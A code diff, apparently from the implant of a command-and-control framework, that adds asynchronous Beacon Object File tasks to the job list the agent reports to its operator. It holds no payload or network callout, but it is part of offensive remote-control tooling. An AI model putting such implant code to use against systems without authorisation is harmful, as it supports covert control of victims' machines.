@@ -417,8 +417,15 @@ void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker
 	outPacker->Pack32(commandId);
 
 	ULONG count = agent->jober->jobs.size();
+	ULONG asyncBofCount = 0;
+	
+	if (g_AsyncBofManager)
+		ApiWin->EnterCriticalSection(&g_AsyncBofManager->managerLock);
+	
+	if (g_AsyncBofManager)
+		asyncBofCount = g_AsyncBofManager->asyncBofs.size();
 
-	outPacker->Pack32(count);
+	outPacker->Pack32(count + asyncBofCount);
 
 	for (int i = 0; i < count; i++) {
 		ULONG jobId  = agent->jober->jobs[i].jobId;
@@ -428,6 +435,16 @@ void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker
 		outPacker->Pack32(jobId);
 		outPacker->Pack16(jobType);
 		outPacker->Pack16(pid);
+	}
+
+	if (g_AsyncBofManager) {
+		for (size_t i = 0; i < asyncBofCount; i++) {
+			AsyncBofContext* ctx = g_AsyncBofManager->asyncBofs[i];
+			outPacker->Pack32(ctx->taskId);
+			outPacker->Pack16(JOB_TYPE_ASYNCBOF);
+			outPacker->Pack16(0);
+		}
+		ApiWin->LeaveCriticalSection(&g_AsyncBofManager->managerLock);
 	}
 }
 
